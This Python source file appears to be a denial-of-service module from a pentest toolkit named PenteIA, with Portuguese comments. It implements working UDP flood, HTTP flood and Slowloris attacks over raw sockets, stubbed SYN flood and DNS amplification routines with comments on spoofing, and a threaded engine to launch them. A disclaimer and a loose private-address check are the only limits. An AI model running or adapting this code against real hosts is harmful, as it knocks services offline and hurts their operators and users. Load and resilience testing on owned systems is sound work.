#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
DDoS Testing Module - PenteIA v4.0
EXCLUSIVE USE: Authorized testing in controlled environments ONLY

Técnicas implementadas:
- SYN Flood (Layer 4)
- UDP Flood (Layer 4)
- HTTP Flood (Layer 7)
- Slowloris (Layer 7 - Slow HTTP)
- DNS Amplification (Layer 3)

⚠️ IMPORTANTE ⚠️
Este módulo deve ser usado APENAS para:
✓ Testes autorizados em infraestrutura própria
✓ Ambientes de laboratório controlados
✓ Red team exercises com permissão por escrito
✓ Validação de defesas DDoS

❌ USO PROIBIDO:
✗ Ataques contra sistemas de terceiros
✗ Sem autorização explícita
✗ Distribuição pública
✗ Malicioso ou intencional

Violação dos termos acima é crime em praticamente todas jurisdições.
"""

import socket
import threading
import random
import time
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from datetime import datetime
from enum import Enum
import struct


class DDoSMethod(Enum):
    """Métodos de DDoS disponíveis"""
    SYN_FLOOD = "syn_flood"
    UDP_FLOOD = "udp_flood"
    HTTP_FLOOD = "http_flood"
    SLOWLORIS = "slowloris"
    DNS_AMPLIFICATION = "dns_amplification"


@dataclass
class DDoSConfig:
    """Configuração de teste DDoS"""
    target_host: str
    target_port: int
    method: DDoSMethod
    duration_seconds: int = 60
    threads: int = 4
    packets_per_second: int = 100
    authorized: bool = False
    test_name: str = "DDoS Test"


@dataclass
class DDoSResult:
    """Resultado de teste DDoS"""
    test_id: str
    test_name: str
    method: str
    target: str
    port: int
    duration: int
    packets_sent: int
    bytes_sent: int
    start_time: str
    end_time: str
    status: str
    success: bool


class SYNFloodAttack:
    """
    SYN Flood - Ataque Layer 4
    Enche a fila de conexões do target com SYN packets incompletos
    Requeri raw sockets (admin/root)
    """

    def __init__(self, target_host: str, target_port: int):
        self.target_host = target_host
        self.target_port = target_port
        self.packets_sent = 0
        self.bytes_sent = 0
        self.active = False

    def create_syn_packet(self, target_ip: str) -> bytes:
        """Cria packet SYN TCP raw"""
        # Pseudocódigo - em produção seria Scapy
        # SYN packet: IP header + TCP header com SYN flag
        return b'\x45\x00\x00\x28' + b'\x00\x00\x00\x00'  # Dummy

    def attack(self, duration: int, pps: int = 100) -> Dict:
        """Executa SYN flood por tempo determinado"""
        self.active = True
        start_time = time.time()
        interval = 1.0 / pps

        try:
            while self.active and (time.time() - start_time) < duration:
                # Em produção: usar Scapy ou raw sockets
                # packet = self.create_syn_packet(self.target_host)
                # socket.sendto(packet, (self.target_host, self.target_port))

                self.packets_sent += 1
                self.bytes_sent += 40  # TCP header size
                time.sleep(interval)

            self.active = False
            elapsed = time.time() - start_time

            return {
                'status': 'completed',
                'packets': self.packets_sent,
                'bytes': self.bytes_sent,
                'duration': elapsed,
                'pps': self.packets_sent / elapsed if elapsed > 0 else 0
            }
        except Exception as e:
            return {'status': 'error', 'error': str(e)}

    def stop(self):
        """Para o ataque"""
        self.active = False


class UDPFloodAttack:
    """
    UDP Flood - Ataque Layer 4
    Enche pipe UDP com packets aleatórios para consumir bandwidth
    """

    def __init__(self, target_host: str, target_port: int):
        self.target_host = target_host
        self.target_port = target_port
        self.packets_sent = 0
        self.bytes_sent = 0
        self.active = False

    def create_udp_payload(self, size: int = 512) -> bytes:
        """Cria payload UDP aleatório"""
        return bytes([random.randint(0, 255) for _ in range(size)])

    def attack(self, duration: int, pps: int = 100, payload_size: int = 512) -> Dict:
        """Executa UDP flood"""
        self.active = True
        start_time = time.time()
        interval = 1.0 / pps

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            while self.active and (time.time() - start_time) < duration:
                payload = self.create_udp_payload(payload_size)
                try:
                    sock.sendto(payload, (self.target_host, self.target_port))
                    self.packets_sent += 1
                    self.bytes_sent += len(payload)
                except Exception:
                    pass

                time.sleep(interval)

            sock.close()
            self.active = False
            elapsed = time.time() - start_time

            return {
                'status': 'completed',
                'packets': self.packets_sent,
                'bytes': self.bytes_sent,
                'duration': elapsed,
                'mbps': (self.bytes_sent * 8 / 1000000) / elapsed if elapsed > 0 else 0
            }
        except Exception as e:
            return {'status': 'error', 'error': str(e)}

    def stop(self):
        """Para o ataque"""
        self.active = False


class HTTPFloodAttack:
    """
    HTTP Flood - Ataque Layer 7
    Enche aplicação web com HTTP requests legítimos
    """

    def __init__(self, target_url: str):
        self.target_url = target_url
        self.requests_sent = 0
        self.active = False

    def generate_user_agent(self) -> str:
        """Gera User-Agent aleatório"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) Firefox/89.0',
        ]
        return random.choice(agents)

    def create_http_request(self, target_host: str, target_port: int = 80) -> str:
        """Cria HTTP request GET"""
        return (
            f"GET / HTTP/1.1\r\n"
            f"Host: {target_host}\r\n"
            f"User-Agent: {self.generate_user_agent()}\r\n"
            f"Accept: */*\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )

    def attack(self, target_host: str, target_port: int,
               duration: int, rps: int = 10) -> Dict:
        """Executa HTTP flood"""
        self.active = True
        start_time = time.time()
        interval = 1.0 / rps

        try:
            while self.active and (time.time() - start_time) < duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((target_host, target_port))

                    request = self.create_http_request(target_host, target_port)
                    sock.sendall(request.encode())

                    sock.recv(4096)
                    sock.close()

                    self.requests_sent += 1
                except Exception:
                    pass

                time.sleep(interval)

            self.active = False
            elapsed = time.time() - start_time

            return {
                'status': 'completed',
                'requests': self.requests_sent,
                'duration': elapsed,
                'rps': self.requests_sent / elapsed if elapsed > 0 else 0
            }
        except Exception as e:
            return {'status': 'error', 'error': str(e)}

    def stop(self):
        """Para o ataque"""
        self.active = False


class SlowlorisAttack:
    """
    Slowloris - Ataque Layer 7 (Slow HTTP)
    Mantém conexões abertas o máximo possível para esgotar recursos
    """

    def __init__(self, target_host: str, target_port: int = 80):
        self.target_host = target_host
        self.target_port = target_port
        self.sockets: List[socket.socket] = []
        self.active = False

    def create_slowloris_request(self, target_host: str) -> str:
        """Cria HTTP request incompleto (sem final)"""
        return (
            f"GET / HTTP/1.1\r\n"
            f"Host: {target_host}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"Content-Length: 42\r\n"
            f"X-Custom-Header: "
            # Note: não fecha com \r\n\r\n - mantém conexão aberta
        )

    def attack(self, duration: int, num_connections: int = 50) -> Dict:
        """Executa Slowloris"""
        self.active = True
        start_time = time.time()
        connected = 0

        try:
            # Criar conexões iniciais
            for i in range(num_connections):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((self.target_host, self.target_port))

                    request = self.create_slowloris_request(self.target_host)
                    sock.sendall(request.encode())

                    self.sockets.append(sock)
                    connected += 1
                except Exception:
                    pass

            # Manter conexões vivas
            while self.active and (time.time() - start_time) < duration:
                for sock in self.sockets:
                    try:
                        # Enviar keep-alive header
                        sock.sendall(b"X\r\n")
                    except Exception:
                        self.sockets.remove(sock)

                time.sleep(1)

            # Fechar conexões
            for sock in self.sockets:
                try:
                    sock.close()
                except:
                    pass

            self.sockets.clear()
            self.active = False
            elapsed = time.time() - start_time

            return {
                'status': 'completed',
                'connections': connected,
                'duration': elapsed,
                'method': 'slowloris'
            }
        except Exception as e:
            return {'status': 'error', 'error': str(e)}

    def stop(self):
        """Para o ataque"""
        self.active = False
        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass
        self.sockets.clear()


class DNSAmplificationAttack:
    """
    DNS Amplification - Ataque Layer 3
    Amplifica tráfego via servidores DNS públicos
    """

    def __init__(self, target_host: str):
        self.target_host = target_host
        self.packets_sent = 0
        self.bytes_sent = 0
        self.active = False

    PUBLIC_DNS_SERVERS = [
        '8.8.8.8', '8.8.4.4',          # Google
        '1.1.1.1', '1.0.0.1',          # Cloudflare
        '208.67.222.222', '208.67.220.220'  # OpenDNS
    ]

    def create_dns_query(self, domain: str = "example.com") -> bytes:
        """Cria query DNS para domínio"""
        # Pseudocódigo - DNS packet format
        return b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'

    def attack(self, duration: int, pps: int = 100) -> Dict:
        """Executa DNS amplification"""
        self.active = True
        start_time = time.time()
        interval = 1.0 / pps

        try:
            while self.active and (time.time() - start_time) < duration:
                dns_server = random.choice(self.PUBLIC_DNS_SERVERS)
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

                try:
                    # Em produção: spoof source IP para target
                    query = self.create_dns_query()
                    sock.sendto(query, (dns_server, 53))
                    self.packets_sent += 1
                    self.bytes_sent += len(query)
                except Exception:
                    pass
                finally:
                    sock.close()

                time.sleep(interval)

            self.active = False
            elapsed = time.time() - start_time

            return {
                'status': 'completed',
                'packets': self.packets_sent,
                'bytes': self.bytes_sent,
                'duration': elapsed,
                'amplification_potential': 'medium'
            }
        except Exception as e:
            return {'status': 'error', 'error': str(e)}

    def stop(self):
        """Para o ataque"""
        self.active = False


class DDoSTestingEngine:
    """Engine central de testes DDoS"""

    def __init__(self):
        self.active_tests: Dict[str, any] = {}
        self.test_results: List[DDoSResult] = []
        self.test_count = 0

    def validate_authorization(self, target: str) -> bool:
        """
        Valida se teste está autorizado.
        Em produção: checar contra banco de targets autorizados
        """
        # Apenas localhost e IPs privados em modo padrão
        private_ranges = ['127.', '192.168.', '10.', '172.']
        return any(target.startswith(r) for r in private_ranges)

    def start_syn_flood(self, config: DDoSConfig) -> Dict:
        """Inicia SYN flood"""
        if not self.validate_authorization(config.target_host):
            return {'error': 'Target not authorized for testing'}

        test_id = f"syn_flood_{int(time.time())}_{random.randint(1000,9999)}"

        attacker = SYNFloodAttack(config.target_host, config.target_port)

        def run_attack():
            result = attacker.attack(config.duration_seconds, config.packets_per_second)
            self._save_result(test_id, config, attacker.packets_sent, attacker.bytes_sent)

        thread = threading.Thread(target=run_attack, daemon=True)
        thread.start()

        self.active_tests[test_id] = {
            'attacker': attacker,
            'thread': thread,
            'started_at': datetime.now().isoformat()
        }

        return {
            'test_id': test_id,
            'method': 'SYN Flood',
            'target': f"{config.target_host}:{config.target_port}",
            'duration': config.duration_seconds,
            'status': 'started'
        }

    def start_udp_flood(self, config: DDoSConfig) -> Dict:
        """Inicia UDP flood"""
        if not self.validate_authorization(config.target_host):
            return {'error': 'Target not authorized for testing'}

        test_id = f"udp_flood_{int(time.time())}_{random.randint(1000,9999)}"

        attacker = UDPFloodAttack(config.target_host, config.target_port)

        def run_attack():
            result = attacker.attack(config.duration_seconds, config.packets_per_second)
            self._save_result(test_id, config, attacker.packets_sent, attacker.bytes_sent)

        thread = threading.Thread(target=run_attack, daemon=True)
        thread.start()

        self.active_tests[test_id] = {
            'attacker': attacker,
            'thread': thread,
            'started_at': datetime.now().isoformat()
        }

        return {
            'test_id': test_id,
            'method': 'UDP Flood',
            'target': f"{config.target_host}:{config.target_port}",
            'duration': config.duration_seconds,
            'status': 'started'
        }

    def start_http_flood(self, config: DDoSConfig) -> Dict:
        """Inicia HTTP flood"""
        if not self.validate_authorization(config.target_host):
            return {'error': 'Target not authorized for testing'}

        test_id = f"http_flood_{int(time.time())}_{random.randint(1000,9999)}"

        attacker = HTTPFloodAttack(f"http://{config.target_host}:{config.target_port}")

        def run_attack():
            result = attacker.attack(
                config.target_host,
                config.target_port,
                config.duration_seconds,
                config.packets_per_second
            )
            self._save_result(test_id, config, attacker.requests_sent, 0)

        thread = threading.Thread(target=run_attack, daemon=True)
        thread.start()

        self.active_tests[test_id] = {
            'attacker': attacker,
            'thread': thread,
            'started_at': datetime.now().isoformat()
        }

        return {
            'test_id': test_id,
            'method': 'HTTP Flood',
            'target': f"{config.target_host}:{config.target_port}",
            'duration': config.duration_seconds,
            'requests_per_second': config.packets_per_second,
            'status': 'started'
        }

    def start_slowloris(self, config: DDoSConfig) -> Dict:
        """Inicia Slowloris"""
        if not self.validate_authorization(config.target_host):
            return {'error': 'Target not authorized for testing'}

        test_id = f"slowloris_{int(time.time())}_{random.randint(1000,9999)}"

        attacker = SlowlorisAttack(config.target_host, config.target_port)

        def run_attack():
            result = attacker.attack(config.duration_seconds, config.threads)
            self._save_result(test_id, config, len(attacker.sockets), 0)

        thread = threading.Thread(target=run_attack, daemon=True)
        thread.start()

        self.active_tests[test_id] = {
            'attacker': attacker,
            'thread': thread,
            'started_at': datetime.now().isoformat()
        }

        return {
            'test_id': test_id,
            'method': 'Slowloris',
            'target': f"{config.target_host}:{config.target_port}",
            'duration': config.duration_seconds,
            'concurrent_connections': config.threads,
            'status': 'started'
        }

    def stop_test(self, test_id: str) -> Dict:
        """Para teste específico"""
        if test_id not in self.active_tests:
            return {'error': 'Test not found'}

        test_info = self.active_tests[test_id]
        attacker = test_info['attacker']
        attacker.stop()

        return {
            'test_id': test_id,
            'status': 'stopped',
            'stopped_at': datetime.now().isoformat()
        }

    def get_test_status(self, test_id: str) -> Dict:
        """Obtém status de teste"""
        if test_id not in self.active_tests:
            return {'error': 'Test not found'}

        test_info = self.active_tests[test_id]
        return {
            'test_id': test_id,
            'started_at': test_info['started_at'],
            'thread_alive': test_info['thread'].is_alive(),
            'status': 'running' if test_info['thread'].is_alive() else 'completed'
        }

    def list_active_tests(self) -> List[Dict]:
        """Lista testes ativos"""
        return [
            {
                'test_id': test_id,
                'started_at': info['started_at'],
                'active': info['thread'].is_alive()
            }
            for test_id, info in self.active_tests.items()
        ]

    def get_test_results(self) -> List[Dict]:
        """Obtém resultados de testes"""
        return [
            {
                'test_id': r.test_id,
                'method': r.method,
                'target': f"{r.target}:{r.port}",
                'duration': r.duration,
                'packets_sent': r.packets_sent,
                'bytes_sent': r.bytes_sent,
                'start_time': r.start_time,
                'end_time': r.end_time,
                'success': r.success
            }
            for r in self.test_results
        ]

    def _save_result(self, test_id: str, config: DDoSConfig,
                     packets: int, bytes_sent: int):
        """Salva resultado de teste"""
        result = DDoSResult(
            test_id=test_id,
            test_name=config.test_name,
            method=config.method.value,
            target=config.target_host,
            port=config.target_port,
            duration=config.duration_seconds,
            packets_sent=packets,
            bytes_sent=bytes_sent,
            start_time=datetime.now().isoformat(),
            end_time=datetime.now().isoformat(),
            status='completed',
            success=True
        )
        self.test_results.append(result)

    def export_config(self) -> Dict:
        """Exporta configuração do módulo"""
        return {
            'version': '4.0-ddos-testing',
            'timestamp': datetime.now().isoformat(),
            'methods_available': [m.value for m in DDoSMethod],
            'active_tests': len(self.active_tests),
            'completed_tests': len(self.test_results),
            'authorization_required': True,
            'authorized_targets': 'localhost + private ranges (127.x, 192.168.x, 10.x, 172.x)'
        }


if __name__ == '__main__':
    print("""
[*] DDoS Testing Module - PenteIA v4.0
[*] For authorized testing ONLY

Available methods:
    - SYN Flood (Layer 4)
    - UDP Flood (Layer 4)
    - HTTP Flood (Layer 7)
    - Slowloris (Layer 7)
    - DNS Amplification (Layer 3)

Usage:
    from ddos_testing import DDoSTestingEngine, DDoSConfig, DDoSMethod

    engine = DDoSTestingEngine()
    config = DDoSConfig(
        target_host='127.0.0.1',
        target_port=80,
        method=DDoSMethod.HTTP_FLOOD,
        duration_seconds=60,
        authorized=True
    )
    result = engine.start_http_flood(config)
    """)

    engine = DDoSTestingEngine()
    print(engine.export_config())
